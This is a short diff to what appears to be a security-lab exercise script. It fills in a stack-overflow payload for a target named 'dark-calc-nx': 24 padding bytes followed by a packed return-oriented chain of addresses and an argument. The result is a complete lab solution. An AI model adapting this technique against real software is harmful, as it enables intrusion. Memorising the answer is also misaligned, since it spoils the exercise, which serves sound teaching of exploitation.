@@ -1,10 +1,11 @@
 #!/usr/bin/env python3
 """Task 3: build the payload for attack/dark-calc-nx.
-
-TODO: replace the empty payload with the bytes required by the lab.
 """
 import sys
+import struct
 
-payload = b""
+pad = b"A" * 24
+chain = struct.pack("<Q", 0x401a33) + struct.pack("<Q", 4) + struct.pack("<Q", 0x401978)
+payload = pad + chain + b"\n"
 
 sys.stdout.buffer.write(payload)
